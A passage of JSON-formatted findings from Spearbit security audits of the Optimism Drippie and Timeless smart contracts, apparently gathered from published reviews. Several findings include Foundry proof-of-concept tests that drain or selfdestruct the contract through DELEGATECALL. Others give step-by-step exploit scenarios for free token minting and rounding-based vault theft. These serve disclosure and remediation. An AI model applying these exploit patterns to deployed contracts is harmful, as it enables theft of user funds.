any of the following operations:  Creating a new drip  Updating a drips status (pausing, activating or archiving a drip) If set to the zero address, all the onlyOwner operations in AssetReceiver and Transactor will be uncallable. This scenario where the owner can be set to address(0) can occur when address(0) is passed to the construc- tor or setOwner.  Scenario 2 owner may be set to address(this). Given the static nature of DripAction.target and DripAction.data there is no benefit of setting owner to address(this), and all instances can be assumed to have been done so in error.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "Unchecked Return and Handling of Non-standard Tokens in AssetReceiver", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "The current AssetReceiver contract implement \"direct\" ETH and ERC20 token transfers, but does not cover edge cases like non-standard ERC20 tokens that do not:  revert on failed transfers  adhere to ERC20 interface (i.e. no return value) An ERC20 token that does not revert on failure would cause the WithdrewERC20 event to emit even though no transfer took place. An ERC20 token that does not have a return value will revert even if the call would have otherwise been successful. Solmate libraries already used inside the project offer a utility library called SafeTransferLib.sol which covers such edge cases. Be aware of the developer comments in the natspec: /// @dev Use with caution! Some functions in this library knowingly create dirty bits at the destination of the free memory pointer. /// @dev Note that none of the functions in this library check that a token has code at all! That responsibility is delegated to the caller.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "AssetReceiver Allows Burning ETH, ERC20 and ERC721 Tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "AssetReceiver contains functions that allow the owner of the contract to withdraw ETH, ERC20 and ERC721 tokens. Those functions allow specifying the receiver address of ETH, ERC20 and ERC721 tokens but they do not check that the receiver address is not address(0). By not doing so, those functions allow to:  Burn ETH if sent to address(0).  Burn ERC20 tokens if sent to address(0) and the ERC20 _asset allow tokens to be burned via transfer (For example, Solmates ERC20 allow that, OpenZeppelin instead will revert if the recipient is address(0)).  Burn ERC721 tokens if sent to address(0) and the ERC721 _asset allow tokens to be burned via trans- ferFrom (For example, both Solmate and OpenZeppelin implementations prevent to send the _id to the address(0) but you dont know if that is still true about custom ERC721 contract that does not use those libraries).", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "AssetReceiver Not Implementing onERC721Received Callback Required by safeTransferFrom.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "AssetReceiver contains the function withdrawERC721 that allow the owner to withdraw ERC721 tokens. As stated in the EIP-721, the safeTransferFrom (used by the sender to transfer ERC721 tokens to the AssetRe- ceiver) will revert if the target contract (AssetReceiver in this case) is not implementing onERC721Received and returning the expected value bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\")).", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "Both Transactor.CALL and Transactor.DELEGATECALL Do Not Emit Events", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Transactor contains a \"general purpose\" DELEGATECALL and CALL function that allow the owner to execute a delegatecall and call toward a target address passing an arbitrary payload. Both of those functions are executing delegatecall and call without emitting any events. Because of the general- purpose nature of these function, it would be considered a good security measure to emit events to track the functions usage. Those events could be then used to monitor and track usage by external monitoring services.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "Both Transactor.CALL and Transactor.DELEGATECALL Do Not Check the Result of the Execution", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "The Transactor contract contains a \"general purpose\" DELEGATECALL and CALL function that allow the owner to execute a delegatecall and call toward a target address passing an arbitrary payload. Both functions return the delegatecall and call result back to the caller without checking whether execution was successful or not. By not implementing such check, the transaction could fail silently. Another side effect is that the ETH sent along with the execution (both functions are payable) would remain in the Drippie contract and not transferred to the _target. Test example showcasing the issue: contract Useless { // A contract that have no functions // No fallback functions // Will not accept ETH (only from selfdestruct/coinbase) } function test_transactorCALL() public { Useless useless = new Useless(); bool success; vm.deal(deployer, 3 ether); vm.deal(address(drippie), 0 ether); vm.deal(address(useless), 0 ether); vm.prank(deployer); // send 1 ether via `call` to a contract that cannot receive them 8 (success, ) = drippie.CALL{value: 1 ether}(address(useless), \"\", 100000, 1 ether); assertEq(success, false); vm.prank(deployer); // Perform a `call` to a not existing target's function (success, ) = drippie.CALL{value: 1 ether}(address(useless), abi.encodeWithSignature(\"notExistingFn()\"), 100000, 1 ether); assertEq(success, false); assertEq(deployer.balance, 1 ether); assertEq(address(drippie).balance, 2 ether); assertEq(address(useless).balance, 0); ,! } function test_transactorDELEGATECALL() public { Useless useless = new Useless(); bool success; vm.deal(deployer, 3 ether); vm.deal(address(drippie), 0 ether); vm.deal(address(useless), 0 ether); vm.prank(deployer); // send 1 ether via `delegatecall` to a contract that cannot receive them (success, ) = drippie.DELEGATECALL{value: 1 ether}(address(useless), \"\", 100000); assertEq(success, false); vm.prank(deployer); // Perform a `delegatecall` to a not existing target's function (success, ) = drippie.DELEGATECALL{value: 1 ether}(address(useless), abi.encodeWithSignature(\"notExistingFn()\"), 100000); assertEq(success, false); assertEq(deployer.balance, 1 ether); assertEq(address(drippie).balance, 2 ether); assertEq(address(useless).balance, 0); ,! }", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "Transactor.DELEGATECALL Data Overwrite and selfdestruct Risks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "The Transactor contract contains a \"general purpose\" DELEGATECALL function that allow the owner to execute a delegatecall toward a target address passing an arbitrary payload. Consider the following scenarios:  Scenario 1 A malicious target contract could selfdestruct the Transactor contract and as a consequence the contract that is inheriting from Transactor. Test example showcasing the issue: 9 contract SelfDestroyer { function destroy(address receiver) external { selfdestruct(payable(receiver)); } } function test_canOwnerSelftDestructDrippie() public { // Assert that Drippie exist assertStatus(DEFAULT_DRIP_NAME, Drippie.DripStatus.PAUSED); assertGt(getContractSize(address(drippie)), 0); // set it to active vm.prank(deployer); drippie.status(DEFAULT_DRIP_NAME, Drippie.DripStatus.ACTIVE); assertStatus(DEFAULT_DRIP_NAME, Drippie.DripStatus.ACTIVE); // fund the drippie with 1 ETH vm.deal(address(drippie), 1 ether); uint256 deployerBalanceBefore = deployer.balance; uint256 drippieBalanceBefore = address(drippie).balance; // deploy the destroyer SelfDestroyer selfDestroyer = new SelfDestroyer(); vm.prank(deployer); drippie.DELEGATECALL(address(selfDestroyer), abi.encodeWithSignature(\"destroy(address)\", deployer), gasleft()); ,! uint256 deployerBalanceAfter = deployer.balance; uint256 drippieBalanceAfter = address(drippie).balance; // assert that the deployer has received the balance that was present in Drippie assertEq(deployerBalanceAfter, deployerBalanceBefore + drippieBalanceBefore); assertEq(drippieBalanceAfter, 0); // Weird things happens with forge // Because we are in the same block the code of the contract is still > 0 so // Cannot use assertEq(getContractSize(address(drippie)), 0); // Known forge issue // 1) Forge resets storage var to 0 after self-destruct (before tx ends) 2654 -> https://github.com/foundry-rs/foundry/issues/2654 // 2) selfdestruct has no effect in test 1543 -> https://github.com/foundry-rs/foundry/issues/1543 assertStatus(DEFAULT_DRIP_NAME, Drippie.DripStatus.PAUSED); ,! }  Scenario 2 The delegatecall allows the owner to intentionally, or accidentally, overwrite the content of the drips mapping. By being able to modify the drips mapping, a malicious user would be able to execute a series of actions like: Changing drips status:  Activating an archived drip  Deleting a drip by changing the status to NONE (this allows the owner to override entirely the drip by calling again create)  Switching an active/paused drip to paused/active 10  etc.. Change drips interval:  Prevent a drip from being executed any more by setting interval to a very high value  Allow a drip to be executed more frequently by lowering the interval value  Enable reentrancy by setting interval to 0 Change drips actions:  Override an action to send drips contract balance to an arbitrary address  etc.. Test example showcasing the issue: contract ChangeDrip { address public owner; mapping(string => Drippie.DripState) public drips; function someInnocentFunction() external { drips[\"FUND_BRIDGE_WALLET\"].config.actions[0] = Drippie.DripAction({ target: payable(address(1024)), data: new bytes(0), value: 1 ether }); } } 11 function test_canDELEGATECALLAllowReplaceAction() public { vm.deal(address(drippie), 10 ether); vm.deal(address(attacker), 0 ether); // Create an action with name \"FUND_BRIDGE_WALLET\" that have the function // To fund a wallet vm.startPrank(deployer); string memory fundBridgeWalletName = \"FUND_BRIDGE_WALLET\"; Drippie.DripAction[] memory actions = new Drippie.DripAction[](1); // The first action will send Bob 1 ether actions[0] = Drippie.DripAction({ target: payable(address(alice)), data: new bytes(0), value: 1 ether ,! }); Drippie.DripConfig memory config = createConfig(100, IDripCheck(address(checkTrue)), new bytes(0), actions); drippie.create(fundBridgeWalletName, config); drippie.status(fundBridgeWalletName, Drippie.DripStatus.ACTIVE); vm.stopPrank(); // Deploy the malicius contract vm.prank(attacker); ChangeDrip changeDripContract = new ChangeDrip(); // make the owner of drippie call via DELEGATECALL an innocentfunction of the exploiter contract vm.prank(deployer); drippie.DELEGATECALL(address(changeDripContract), abi.encodeWithSignature(\"someInnocentFunction()\"), 1000000); ,! // Now the drip action should have changed, anyone can execute it and funds would be sent to // the attacker and not to the bridge wallet drippie.drip(fundBridgeWalletName); // Assert we have drained Drippie assertEq(attacker.balance, 1 ether); assertEq(address(drippie).balance, 9 ether); }  Scenario 3 Calling a malicious contract or accidentally calling a contract which does not account for Drippies storage layout can result in owner being overwritten. Test example showcasing the issue: contract GainOwnership { address public owner; function someInnocentFunction() external { owner = address(1024); } } 12 function test_canDELEGATECALLAllowOwnerLoseOwnership() public { vm.deal(address(drippie), 10 ether); vm.deal(address(attacker), 0 ether); // Deploy the malicius contract vm.prank(attacker); GainOwnership gainOwnershipContract = new GainOwnership(); // make the owner of drippie call via DELEGATECALL an innocentfunction of the exploiter contract vm.prank(deployer); drippie.DELEGATECALL(address(gainOwnershipContract), abi.encodeWithSignature(\"someInnocentFunction()\"), 1000000); ,! // Assert that the attacker has gained onwership assertEq(drippie.owner(), attacker); // Steal all the funds vm.prank(attacker); drippie.withdrawETH(payable(attacker)); // Assert we have drained Drippie assertEq(attacker.balance, 10 ether); assertEq(address(drippie).balance, 0 ether); }", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "Use calldata over memory", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Some gas savings if function arguments are passed as calldata instead of memory.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Gas Optimization"]}, {"title": "Avoid String names in Events and Mapping Key", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Drip events emit an indexed nameref and the name as a string. These strings must be passed into every drip call adding to gas costs for larger strings.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Gas Optimization"]}, {"title": "Avoid Extra sloads on Drippie.status", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Information for emitting event can be taken from calldata instead of reading from storage. Can skip repeat drips[_name].status reads from storage.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Gas Optimization"]}, {"title": "Use Custom Errors Instead of Strings", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "To save some gas the use of custom errors leads to cheaper deploy time cost and run time cost. The run time cost is only relevant when the revert condition is met.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Gas Optimization"]}, {"title": "Increment In The For Loop Post Condition In An Unchecked Block", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "This is only relevant if you are using the default solidity checked arithmetic. i++ involves checked arithmetic, which is not required. This is because the value of i is always strictly less than length <= 2**256 - 1. Therefore, the theoretical maximum value of i to enter the for-loop body is 2**256 - 2. This means that the i++ in the for loop can never overflow. Regardless, the overflow checks are performed by the compiler. Unfortunately, the Solidity optimizer is not smart enough to detect this and remove the checks. One can manually do this by: for (uint i = 0; i < length; ) { // do something that doesn't change the value of i unchecked { ++i; } }", "labels": ["Spearbit", "OptimismDrippie", "Severity: Gas Optimization"]}, {"title": "DripState.count Location and Use", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "DripState.count is recorded and never used within the Drippie or IDripCheck contracts. DripState.count is also incremented after all external calls, inconsistent with Checks, Effects, Interactions con- vention.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Type Checking Foregone on DripCheck", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Passing params as bytes makes for a flexible DripCheck, however, type checking is lost.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Confirm Blind ERC721 Transfers are Intended", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "AssetReceiver uses transferFrom instead of safeTransferFrom. The callback on safeTransferFrom often poses a reentrancy risk but in this case the function is restricted to onlyOwner.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Code Contains Empty Blocks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Its best practice that when there is an empty block, to add a comment in the block explaining why its empty. While not technically errors, they can cause confusion when reading code.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Code Structure Deviates From Best-Practice", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "The best-practice layout for a contract should follow this order:  State variables.  Events.  Modifiers.  Constructor.  Functions. Function ordering helps readers identify which functions they can call and find constructor and fallback functions easier. Functions should be grouped according to their visibility and ordered as: constructor, receive function (if ex- ists), fallback function (if exists), external, public, internal, private. Some constructs deviate from this recommended best-practice: structs and mappings after events.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Missing or Incomplete NatSpec", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Some functions are missing @notice/@dev NatSpec comments for the function, @param for all/some of their parameters and @return for return values. Given that NatSpec is an important part of code documentation, this affects code comprehension, auditability and usability.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Checking Boolean Against Boolean", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "executable returns a boolean in which case the comparison to true is unnecessary. executable also reverts if any precondition check fails in which case false will never be returned.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Drippie.executable Never Returns false Only true or Reverts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "executable(string memory _name) public view returns (bool). The executable implemented in the Drippie contract has the following signature From the signature and the natspec documentation @return True if the drip is executable, false other- wise. Without reading the code, a user/developer would expect that the function returns true if all the checks passes otherwise false but in reality the function will always return true or revert. Because of this behavior, a reverting drip that do not pass the requirements inside executable will never revert with the message present in the following code executed by the drip function require( executable(_name) == true, \"Drippie: drip cannot be executed at this time, try again later\" );", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Drippie Use Case Notes", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Drippie intends to support use cases outside of the initial hot EOA top-up use case demonstrated by Optimism. To further clarify, weve noted that drips support:  Sending eth  External function calls with fixed params  Preconditions Examples include, conditionally transferring eth or tokens. Calling an admin function iff preconditions are met. Drips do not support:  Updating the drip contract storage  Altering params  Postconditions Examples include, vesting contracts or executing Uniswap swaps based on recent moving averages (which are not without their own risks). Where dynamic params or internal accounting is needed, a separate contract needs to be paired with the drip.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Augment Documentation for dripcheck.check Indicating Precondition Check Only Performed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Before executing the whole batch of actions the drip function call executable that check if the drip can be executed. Inside executable an external contract is called by this instruction require( state.config.dripcheck.check(state.config.checkparams), \"Drippie: dripcheck failed so drip is not yet ready to be triggered\" ); Optimism provided some examples like checking if a target balance is below a specific threshold or above that threshold, but in general, the dripcheck.check invocation could perform any kind of checks. The important part that should be clear in the natspec documentation of the drip function is that that specific check is performed only once before the execution of the bulk of actions.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Considerations on the drip state.last and state.config.interval values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "When the drip function is called by an external actor, the executable is executed to check if the drip meets all the needed requirements to be executed. The only check that is done regarding the drip state.last and state.config.interval is this require( state.last + state.config.interval <= block.timestamp, \"Drippie: drip interval has not elapsed since last drip\" ); The state.time is never really initialized when the create function is called, this means that it will be automatically initialized with the default value of the uint256 type: 0.  Consideration 1: Drips could be executed as soon as created Depending on the value set to state.config.interval the executables logic implies that as soon as a drip is created, the drip can be immediately (even in the same transaction) executed via the drip function.  Consideration 2: A very high value for interval could make the drip never executable block.timestamp represents the number of seconds that passed since Unix Time (1970-01-01T00:00:00Z). When the owner of the Drippie want to create a \"one shot\" drip that can be executed immediately after creation but only once (even if the owner forgets to set the drips status to ARCHIVED) he/she should be aware that the max value that he/she can use for the interval is at max block.timestamp. This mean that the second time the drip can be executed is after block.timestamp seconds have been passed. If, for example, the owner create right now a drip with interval = block.timestamp it means that after the first execution the same drip could be executed after ~52 years (~2022-1970).", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Support ERC1155 in AssetReceiver", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "AssetReceiver support ERC20 and ERC721 interfaces but not ERC1155.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Reorder DripStatus Enum for Clarity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "The current implementation of Drippie contract has the following enum type: enum DripStatus { NONE, // uint8(0) ACTIVE, PAUSED, ARCHIVED } When a drip is created via the create function, its status is initialized to PAUSED (equal to uint8(2)) and when it gets activated its status is changed to ACTIVE (equal to uint8(1)) So, the status change from 0 (NONE) to 2 (PAUSED) to 1 (ACTIVE). Switching the order inside the enum DripStatus definition between PAUSED and ACTIVE would make it more clean and easier to understand.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "_gas is Unneeded as Transactor.CALL and Transactor.DELEGATECALL Function Argument", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "The caller (i.e. contract owner) can control desired amount of gas at the transaction level.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Licensing Conflict on Inherited Dependencies", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Solmate contracts are AGPL Licensed which is incompatible with the MIT License of Drippie related contracts.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Rename Functions for Clarity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "status The status(string memory _name, DripStatus _status) function allows the owner to update the status of a drip. The purpose of the function, based on the name, is not obvious at first sight and could confuse a user into believing that its a view function to retrieve the status of a drip instead of mutating its status. executable The executable(string memory _name) public view returns (bool) function returns true if the drip with name _name can be executed.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Owner Has Permission to Drain Value from Drippie Contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Consider the following scenarios.  Scenario 1 Owner may create arbitrary drips, including a drip to send all funds to themselves.  Scenario 2 AssetReceiver permits owner to withdraw ETH, ERC20 tokens, and ERC721 tokens.  Scenario 3 Owner may execute arbitrary calls. Transactor.CALL function is a function that allows the owner of the contract to execute a \"general purpose\" low- level call. function CALL( address _target, bytes memory _data, uint256 _gas, uint256 _value ) external payable onlyOwner returns (bool, bytes memory) { return _target.call{ gas: _gas, value: _value }(_data); } The function will transfer _value ETH present in the contract balance to the _target address. The function is also payable and this mean that the owner can send along with the call some funds. Test example showcasing the issue: 23 function test_transactorCALLAllowOwnerToDrainDrippieContract() public { bool success; vm.deal(deployer, 0 ether); vm.deal(bob, 0 ether); vm.deal(address(drippie), 1 ether); vm.prank(deployer); // send 1 ether via `call` to a contract that cannot receive them (success, ) = drippie.CALL{value: 0 ether}(bob, \"\", 100000, 1 ether); assertEq(success, true); assertEq(address(drippie).balance, 0 ether); assertEq(bob.balance, 1 ether); }", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Mint PerpetualYieldTokens for free by self-transfer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The PYT.transfer and transferFrom functions operate on cached balance values. When transfer- ring tokens to oneself the decreased balance is overwritten by an increased balance which makes it possible to mint PYT tokens for free. Consider the following exploit scenario:  Attacker A self-transfers by calling token.transfer(A, token.balanceOf(A)).  balanceOf[msg.sender] is rst set to zero but then overwritten by balanceOf[to] = toBalance + amount, doubling As balance.", "labels": ["Spearbit", "Timeless", "Severity: Critical Risk"]}, {"title": "xPYT auto-compound does not take pounder reward into account", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "Conceptually, the xPYT.pound function performs the following steps: 1. Claims yieldAmount yield for itself, deposits the yield back to receive more PYT/NYT (Gate.claimYieldEnter). 2. Buys xPYT with the NYT. 3. Performs a ERC4626.redeem(xPYT) with the bought amount, burning xPYT and receiving pytAmountRedeemed PYT. 4. Performs a ERC4626.deposit(pytAmountRedeemed + yieldAmount = pytCompounded). 5. Pays out a reward in PYT to the caller. The assetBalance is correctly updated for the rst four steps but does not decrease by the pounder reward which is transferred out in the last step. The impact is that the contract has a smaller assets (PYT) balance than what is tracked in assetBalance. 1. Future depositors will have to make up for it as sweep computes the difference between these two values. 2. The xPYT exchange ratio is wrongly updated and withdrawers can redeem xPYT for more assets than they should until the last withdrawer is left holding valueless xPYT. Consider the following example and assume 100% fees for simplicity i.e. pounderReward = pytCompounded.  Vault total: 1k assets, 1k shares total supply.  pound with 100% fee:  claims Y PYT/NYT.  swaps Y NYT to X xPYT.  redeems X xPYT for X PYT by burning X xPYT (supply -= X, exchange ratio is 1-to-1 in example).  assetBalance is increased by claimed Y PYT  pounder receives a pounder reward of X + Y PYT but does not decrease assetBalance by pounder reward X+Y.  Vault totals should be 1k-X assets, 1k-X shares, keeping the same share price.  Nevertheless, vault totals actually are 1k+Y assets, 1k-X shares. Although pounder receives 100% of pound- ing rewards the xPYT price (assets / shares) increased.", "labels": ["Spearbit", "Timeless", "Severity: High Risk"]}, {"title": "Wrong yield accumulation in claimYieldAndEnter", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The claimYieldAndEnter function does not accrue yield to the Gate contract itself (this) in case xPYT was specied. The idea is to accrue yield for the mint recipient rst before increasing/reducing their balance to not interfere with the yield rewards computation. However, in case xPYT is used, tokens are minted to the Gate before its yield is accrued. Currently, the transfer from this to xPYT through the xPYT.deposit call accrues yield for this after the tokens have been minted to it (userPYTBalance * (updatedYieldPerToken - actualUserYieldPerToken) / PRECI- SION) and its balance increased. This leads to it receiving a larger yield amount than it should have.", "labels": ["Spearbit", "Timeless", "Severity: High Risk"]}, {"title": "Swapper left-over token balances can be stolen", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The Swapper contract may never have any left-over token balances after performing a swap because token balances can be stolen by anyone in several ways:  By using Swapper.doZeroExSwap with useSwapperBalance and tokenOut = tokenToSteal  Arbitrary token approvals to arbitrary spenders can be set on behalf of the Swapper contract using UniswapV3Swapper.swapUnderlyingToXpyt.", "labels": ["Spearbit", "Timeless", "Severity: High Risk"]}, {"title": "TickMath might revert in solidity version 0.8", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "UniswapV3s TickMath library was changed to allow compilations for solidity version 0.8. However, adjustments to account for the implicit overow behavior that the contract relies upon were not performed. The In UniswapV3xPYT.sol is compiled with version 0.8 and indirectly uses this library through the OracleLibrary. the worst case, it could be that the library always reverts (instead of overowing as in previous versions), leading to a broken xPYT contract. The same pragma solidity >=0.5.0; instead of pragma solidity >=0.5.0 <0.8.0; adjustments have been made for the OracleLibrary and PoolAddress contracts. However, their code does not rely on implicit overow behavior.", "labels": ["Spearbit", "Timeless", "Severity: Medium Risk"]}, {"title": "Rounding issues when exiting a vault through shares", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "When exiting a vault through Gate.exitToVaultShares the user species a vaultSharesAmount. The amount of PYT&NYT to burn is determined by a burnAmount = _vaultSharesAmountToUnderlying- this function in derived YearnGate and ERC4626 Amount(vaultSharesAmount) call. All contracts round down the burnAmount. This means one needs to burn fewer amounts than the value of the received vault shares. implementations of This attack can be protable and lead to all vault shares being stolen If the gas costs of this attack are low. This can be the case with vault & underlying tokens with a low number of decimals, highly valuable shares, or cheap gas costs. Consider the following scenario: 7  Imagine the following vault assets: totalAssets = 1.9M, supply = 1M. Therefore, 1 share is theoretically worth 1.9 underlying.  Call enterWithUnderlying(underlyingAmount = 1900) to mint 1900 PYT/NYT (and the gate receives 1900 * supply / totalAssets = 1000 vault shares).  Call exitToVaultShares(vaultSharesAmount = 1), then burnAmount = shares.mulDivDown(totalAssets(), supply) = 1 * totalAssets / supply = 1. This burns 1 \"underlying\" (actually PYT/NYT but they are 1-to-1), but receive 1 vault share (worth 1.9 underlying). Repeat this for up to the minted 1900 PYT/NYT.  Can redeem the 1900 vault shares for 3610 underlying directly at the vault, making a prot of 3610 - 1900 = 1710 underlying.", "labels": ["Spearbit", "Timeless", "Severity: Medium Risk"]}, {"title": "Possible outstanding allowances from Gate", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The vault parameter of Gate.enterWithUnderlying can be chosen by an attacker in such a way that underlying = vault.asset() is another vault token of the Gate itself. The subsequent _depositInto- Vault(underlying, underlyingAmount, vault) call will approve underlyingAmount of underlying tokens to the provided vault and could in theory allow stealing from other vault shares. This is currently only exploitable in very rare cases because the caller also has to transfer the underlyingAmount to the gate contract rst. For example, when transferring underlyingAmount = type(uint256).max is possible due to ashloans/ashmints and the vault shares implement approvals in a way that do not decrease anymore if the allowance is type(uint256).max, as is the case with ERC4626 vaults.", "labels": ["Spearbit", "Timeless", "Severity: Low Risk"]}, {"title": "Factory.sol owner can change fees unexpectedly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The Factory.sol owner may be able to front run yield calculations in a gate implementation and change user fees unexpectedly.", "labels": ["Spearbit", "Timeless", "Severity: Low Risk"]}, {"title": "Low uniswapV3TwapSecondsAgo may result in AMM manipulation in pound()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The lower the value of uniswapV3TwapSecondsAgo is set with at construction creation time the easier It becomes easier for attackers to it becomes for an attacker to manipulate the results of the pound() function. manipulate automated market maker price feeds with a lower time horizon, requiring less capital to manipulate prices, although users may simply not use an xPYT contract that sets uniswapV3TwapSecondsAgo too low.", "labels": ["Spearbit", "Timeless", "Severity: Low Risk"]}, {"title": "UniswapV3Swapper uses wrong allowance check", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "Before the UniswapV3Swapper can exit a gate, it needs to set an XPYT allowance to the gate. The following check determines if an approval needs to be set: if ( args.xPYT.allowance(address(this), address(args.gate)) < tokenAmountOut ) { args.xPYT.safeApprove(address(args.gate), type(uint256).max); } args.gate.exitToUnderlying( args.recipient, args.vault, args.xPYT, tokenAmountOut ); The tokenAmountOut is in an underlying token amount but A legitimate gate.exitToUnderlying address(swapper)) checks allowance[swapper][gate] >= previewWithdraw(tokenAmountOut). is compared against an xPYT shares amount. xPYT.withdraw(tokenAmountOut, address(gate), call will call", "labels": ["Spearbit", "Timeless", "Severity: Low Risk"]}, {"title": "Missing check that tokenIn and tokenOut are different", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "The doZeroExSwap() function takes in two ERC20 addresses which are tokenIn and tokenOut. The problem is that the doZeroExSwap() function does not check if the two token addresses are different from one another. Adding this check can reduce possible attack vectors.", "labels": ["Spearbit", "Timeless", "Severity: Low Risk"]}, {"title": "Gate.sol gives unlimitted ERC20 approval on pyt for arbitrary address", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Timeless-Spearbit-Security-Review.pdf", "body": "A malicious contract may be passed into the claimYieldAndEnter() function as xPYT and given full control over any PYT the contract may ever hold. Even though PYT is validated to be a real PYT contract and the Gate.sol contract isnt expected to have any PYT in it, it would be safer to remove any unnecessary approvals.", "labels": ["Spearbit", "Timeless", "Severity: Low Risk"]}, {"title": "Constructor function does not check for zero address", "html_url": 